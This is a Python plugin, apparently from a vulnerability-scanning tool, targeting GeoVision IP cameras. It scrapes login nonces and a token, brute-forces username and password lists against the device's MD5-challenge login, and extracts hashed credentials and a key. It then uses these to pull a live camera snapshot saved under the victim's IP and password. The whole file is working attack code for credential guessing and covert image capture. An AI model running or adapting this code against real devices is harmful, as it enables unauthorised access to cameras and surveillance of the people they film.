import hashlib
import re
import requests

from loguru import logger

from .base import POCTemplate


class GeovisionWeakPassword(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['geovision']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.low
        self.desc = ''
        self.headers = {
            'User-Agent': self.config.user_agent,
        }

    def verify(self, ip, port=80):
        session = requests.session()

        # 先获取构造登录信息需要的变量
        info_url = f"http://{ip}:{port}/ssi.cgi/Login.htm"
        cc1, cc2, token = '', '', ''
        try:
            info_req = session.get(info_url, timeout=self.config.timeout, headers=self.headers, verify=False)
            if info_req.status_code == 200:
                if res := re.findall(r'var cc1="(.*)"; var cc2="(.*)"', info_req.text):
                    cc1, cc2 = res[0]
                if res := re.findall(r"name=web_login_token type=hidden value='(.*)'", info_req.text):
                    token = res[0]
        except Exception as e:
            logger.error(e)
            return None

        # 弱口令尝试
        login_url = f"http://{ip}:{port}/LoginPC.cgi"
        for user in self.config.users:
            for password in self.config.passwords:
                try:
                    data = {
                        'username': '',
                        'password': '',
                        'Apply': '&#24212;&#29992;',
                        'umd5': hashlib.md5((cc1 + user + cc2).encode('utf-8')).hexdigest().upper(),
                        'pmd5': hashlib.md5((cc2 + password + cc1).encode('utf-8')).hexdigest().upper(),
                        'browser': 1,
                        'is_check_OCX_OK': 0,
                    }
                    if token:
                        data['web_login_token'] = int(token)
                        data['browser'] = ''
                    req = session.post(login_url, data=data, timeout=self.config.timeout, headers=self.headers, verify=False)
                    if req.status_code == 200 and 'Web-Manager' in req.text:
                        hashed_user = re.findall(f'gUserName = "(.*)"', req.text)[0]
                        hashed_password = re.findall(f'gPassword = "(.*)"', req.text)[0]
                        desc = re.findall(f'gDesc = "(.*)"', req.text)[0]
                        return ip, str(port), self.product, str(user), str(password), self.name, hashed_user, hashed_password, desc
                except Exception as e:
                    logger.error(e)
        return None

    def exploit(self, results):
        ip, port, product, user, password, vul, hashed_user, hashed_password, desc = results
        img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
        url = f"http://{ip}:{port}/PictureCatch.cgi?username={hashed_user}&password={hashed_password}&data_type=0&attachment=1&channel=1&secret=1&key={desc}"
        return self._snapshot(url, img_file_name)


POCTemplate.register_poc(GeovisionWeakPassword)